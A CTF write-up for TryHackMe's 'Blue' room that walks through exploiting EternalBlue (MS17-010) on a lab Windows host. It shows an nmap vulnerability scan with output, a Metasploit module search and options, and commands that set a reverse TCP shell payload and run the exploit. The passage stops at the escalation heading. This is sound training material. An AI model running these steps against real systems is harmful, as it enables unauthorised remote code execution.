---
tags: [tryhackme, exploit, easy]
categories: [tryhackme, exploit, easy]
icon: chevron-right
author: Ivo Muijtjens
date: 2022-05-26
---
![](/static/headers/blue.png)

# Blue

Deploy & hack into a Windows machine, leveraging common misconfigurations issues. The Blue CTF is an easy box based on the EternalBlue vulnerability [CVE-2017-0143](https://nvd.nist.gov/vuln/detail/CVE-2017-0143). As preparation for this room, I recommend following the Windows Exploration Basics path to get familair with the commands:

[!ref target="blank" text="Windows Fundamentals 1" icon="../static/icons/fundamentals1.png"](https://tryhackme.com/room/windowsfundamentals1xbx)
[!ref target="blank" text="Windows Fundamentals 2" icon="../static/icons/fundamentals2.png"](https://tryhackme.com/room/windowsfundamentals2x0x)
[!ref target="blank" text="Active Directory Basics" icon="../static/icons/activedirectory.png"](https://tryhackme.com/room/activedirectorybasics)
[!ref target="blank" text="Metasploit: Introduction" icon="../static/icons/metasploit.png"](https://tryhackme.com/room/metasploitintro)
[!ref target="blank" text="Metasploit: Exploitation" icon="../static/icons/metasploit.png"](https://tryhackme.com/room/metasploitexploitation)
[!ref target="blank" text="Metasploit: Meterpreter" icon="../static/icons/metasploit.png"](https://tryhackme.com/room/meterpreter)

---

# Writeup

### Reconnaissance

**How many ports are open with a port number under 1000?**

To answer this question I used nmap to scan for open ports and vulnerabilities.

    nmap -sV -p 1-999 --script vuln 10.10.209.54

`-sV` enumerate versions

`-p 1-999` scan all ports under 1000

`--script vuln` argument to scan vulnerabilities

    Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-26 11:10 EDT
    Nmap scan report for 10.10.209.54
    Host is up (0.028s latency).
    Not shown: 996 closed tcp ports (conn-refused)
    PORT    STATE SERVICE      VERSION
    135/tcp open  msrpc        Microsoft Windows RPC
    139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
    445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
    Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    |_smb-vuln-ms10-054: false
    |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
    |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
    | smb-vuln-ms17-010: 
    |   VULNERABLE:
    |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
    |     State: VULNERABLE
    |     IDs:  CVE:CVE-2017-0143
    |     Risk factor: HIGH
    |       A critical remote code execution vulnerability exists in Microsoft SMBv1
    |        servers (ms17-010).
    |           
    |     Disclosure date: 2017-03-14
    |     References:
    |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
    |_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 23.25 seconds

==- Reveal Answer
3
===

**What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)**

Review the nmap output for the answer to this question.

==- Reveal Answer
ms17-010
===

### Gain Access

**Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)**

Start Metasploit with the `msfconsole` command in your terminal. Once Metasploit Framework is initialized, we can search the vulnaribility with command: `search ms17-010`.

    Matching Modules
    ================

    #  Name                                      Disclosure Date  Rank     Check  Description
    -  ----                                      ---------------  ----     -----  -----------
    0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
    1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
    2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
    3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
    4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution

In this case I'm interested in the EternalBlue exploit. Use the command `use 0` to select the exploit. You can also use the full name of the exploit with command `use exploit/windows/smb/ms17_010_eternalblue`.

==- Reveal Answer
exploit/windows/smb/ms17_010_eternalblue
===

**Show options and set the one required value. What is the name of this value? (All caps for submission)**

After selecting the exploit we can show the module options with the command `show options`. Analyze the output of this command. There is one required setting that's not predefined.

    Module options (exploit/windows/smb/ms17_010_eternalblue):

    Name           Current Setting  Required  Description
    ----           ---------------  --------  -----------
    RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
    RPORT          445              yes       The target port (TCP)
    SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
    SMBPass                         no        (Optional) The password for the specified username
    SMBUser                         no        (Optional) The username to authenticate as
    VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
    VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.

==- Reveal Answer
RHOSTS
===

Before we run the exploit, we first select a payload and some options. To find your IP address run the `ifconfig` command and look for the `tun0` interface.

`set payload windows/x64/shell/reverse_tcp`

`set RHOSTS <SERVER IP ADDRESS>`

`set LHOST <YOUR IP ADDRESS>`

With that done, run the exploit. You can run the exploit with either the `run` or `exploit` command.

![Exploit is running](/static/images/exploit-blue.png)

!!!
The exploit is running successfully if you see the Windows shell: `C:\Windows\system32>`.
!!!

### Escalate